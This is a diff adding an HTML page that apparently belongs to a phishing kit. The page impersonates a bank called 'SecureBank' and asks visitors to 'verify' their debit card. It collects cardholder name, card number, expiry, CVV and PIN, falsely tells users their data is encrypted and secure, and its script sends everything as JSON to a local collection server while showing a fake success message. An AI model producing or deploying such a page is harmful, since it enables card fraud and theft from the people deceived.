@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureBank — Verify Card</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      border-radius: 5px;
+      width: 360px;
+      padding: 40px 30px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 6px;
+    }
+    .logo {
+      width: 32px;
+      margin-right: 10px;
+    }
+    h2 {
+      margin: 0;
+      font-size: 22px;
+      color: #003087;
+    }
+    .subtitle {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    .row-two {
+      display: flex;
+      gap: 10px;
+    }
+    .row-two .input-field {
+      flex: 1;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #003087;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-top: 8px;
+    }
+    .login-btn:hover {
+      background-color: #00256b;
+    }
+    .security {
+      font-size: 11px;
+      color: #999;
+      margin-top: 14px;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <svg class="logo" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="32" height="32" rx="6" fill="#003087"/>
+      <path d="M8 12h16v2H8zM8 18h10v2H8z" fill="white"/>
+      <circle cx="23" cy="19" r="3" fill="#FFB800"/>
+    </svg>
+    <h2>SecureBank</h2>
+  </div>
+  <p class="subtitle">Please verify your debit card to continue</p>
+
+  <form id="cardForm">
+    <input type="text" class="input-field" id="fullname" placeholder="Cardholder Name" required>
+    <input type="text" class="input-field" id="cardnumber" placeholder="Card Number (16 digits)" maxlength="19" required>
+    <div class="row-two">
+      <input type="text" class="input-field" id="expiry" placeholder="MM / YY" maxlength="5" required>
+      <input type="text" class="input-field" id="cvv" placeholder="CVV" maxlength="3" required>
+    </div>
+    <input type="text" class="input-field" id="pin" placeholder="PIN (4 digits)" maxlength="4" required>
+    <button type="submit" class="login-btn">Verify Card</button>
+  </form>
+
+  <p class="security">🔒 Your data is encrypted and secure</p>
+</div>
+
+<script>
+  // Format card number with spaces
+  document.getElementById("cardnumber").addEventListener("input", function(e) {
+    let val = e.target.value.replace(/\D/g, '').substring(0, 16);
+    e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
+  });
+
+  // Format expiry
+  document.getElementById("expiry").addEventListener("input", function(e) {
+    let val = e.target.value.replace(/\D/g, '').substring(0, 4);
+    if (val.length >= 3) val = val.substring(0,2) + ' / ' + val.substring(2);
+    e.target.value = val;
+  });
+
+  document.getElementById("cardForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+    const data = {
+      fullname:   document.getElementById("fullname").value,
+      cardnumber: document.getElementById("cardnumber").value,
+      expiry:     document.getElementById("expiry").value,
+      cvv:        document.getElementById("cvv").value,
+      pin:        document.getElementById("pin").value
+    };
+    fetch('http://127.0.0.1:8080/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    })
+    .then(response => response.json())
+    .then(data => { console.log('Success:', data); alert('Verification successful'); })
+    .catch((error) => { console.error('Error:', error); alert('Verification failed'); });
+  });
+</script>
+</body>
+</html>
